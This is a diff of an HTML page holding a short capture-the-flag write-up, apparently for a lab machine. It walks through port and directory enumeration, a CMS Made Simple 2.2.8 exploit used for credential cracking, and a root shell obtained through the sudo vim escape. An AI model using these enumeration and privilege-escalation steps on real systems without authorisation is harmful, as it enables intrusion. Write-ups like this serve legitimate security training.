@@ -122,64 +122,64 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT     STATE SERVICE
+<div class="codehilite"><pre><span></span><code>PORT     STATE SERVICE
 21/tcp   open  ftp
 80/tcp   open  http
 2222/tcp open  EtherNetIP-1
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>❯ gobuster dir -u http://10.201.38.4/ -w /usr/share/dirb/wordlists/small.txt
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="n">gobuster</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.201</span><span class="o">.</span><span class="mf">38.4</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">small</span><span class="o">.</span><span class="n">txt</span>
 
-===============================================================
-Gobuster v3.8
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.201.38.4/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/dirb/wordlists/small.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/simple               (Status: 301) [Size: 311] [--&gt; http://10.201.38.4/simple/]
-</code></pre>
+<span class="o">===============================================================</span>
+<span class="n">Gobuster</span><span class="w"> </span><span class="n">v3</span><span class="o">.</span><span class="mi">8</span>
+<span class="n">by</span><span class="w"> </span><span class="n">OJ</span><span class="w"> </span><span class="n">Reeves</span><span class="w"> </span><span class="p">(</span><span class="err">@</span><span class="n">TheColonial</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Christian</span><span class="w"> </span><span class="n">Mehlmauer</span><span class="w"> </span><span class="p">(</span><span class="err">@</span><span class="n">firefart</span><span class="p">)</span>
+<span class="o">===============================================================</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Url</span><span class="p">:</span><span class="w">                     </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.201</span><span class="o">.</span><span class="mf">38.4</span><span class="o">/</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Method</span><span class="p">:</span><span class="w">                  </span><span class="n">GET</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Threads</span><span class="p">:</span><span class="w">                 </span><span class="mi">10</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Wordlist</span><span class="p">:</span><span class="w">                </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">small</span><span class="o">.</span><span class="n">txt</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Negative</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">codes</span><span class="p">:</span><span class="w">   </span><span class="mi">404</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">Agent</span><span class="p">:</span><span class="w">              </span><span class="n">gobuster</span><span class="o">/</span><span class="mf">3.8</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Timeout</span><span class="p">:</span><span class="w">                 </span><span class="mi">10</span><span class="n">s</span>
+<span class="o">===============================================================</span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">gobuster</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">enumeration</span><span class="w"> </span><span class="n">mode</span>
+<span class="o">===============================================================</span>
+<span class="o">/</span><span class="n">simple</span><span class="w">               </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="p">:</span><span class="w"> </span><span class="mi">311</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="o">--&gt;</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.201</span><span class="o">.</span><span class="mf">38.4</span><span class="o">/</span><span class="n">simple</span><span class="o">/</span><span class="p">]</span>
+</code></pre></div>
 
 <blockquote>
 <p>use CMS Made Simple   CMS Made Simple version 2.2.8 after find vaulnerbility use that exploit.py and use it to crack username &amp; pwd and use it to login ssh</p>
 </blockquote>
-<pre class="codehilite"><code>$ ls
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>ls
 user.txt
-$ cat user.txt
-G00d j0b, keep up!
-$ ls
+$<span class="w"> </span>cat<span class="w"> </span>user.txt
+G00d<span class="w"> </span>j0b,<span class="w"> </span>keep<span class="w"> </span>up!
+$<span class="w"> </span>ls
 user.txt
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>$ cd /home
-$ 
-$ ls
-mitch  sunbath
-$ 
-$ sudo -l
-User mitch may run the following commands on Machine:
-    (root) NOPASSWD: /usr/bin/vim
-</code></pre>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/home
+$<span class="w"> </span>
+$<span class="w"> </span>ls
+mitch<span class="w">  </span>sunbath
+$<span class="w"> </span>
+$<span class="w"> </span>sudo<span class="w"> </span>-l
+User<span class="w"> </span>mitch<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>Machine:
+<span class="w">    </span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/vim
+</code></pre></div>
 
 <blockquote>
 <p>so now know is there something and need to look GTFOBins and after</p>
 </blockquote>
-<pre class="codehilite"><code>$ sudo /usr/bin/vim -c ':!/bin/sh'
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>/usr/bin/vim<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;:!/bin/sh&#39;</span>
 
 
-uid=0(root) gid=0(root) groups=0(root)
-# cd /root
-# ls
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+<span class="c1"># cd /root</span>
+<span class="c1"># ls</span>
 root.txt
-# cat root.txt
-</code></pre>
+<span class="c1"># cat root.txt</span>
+</code></pre></div>
         </div>
     </main>
 
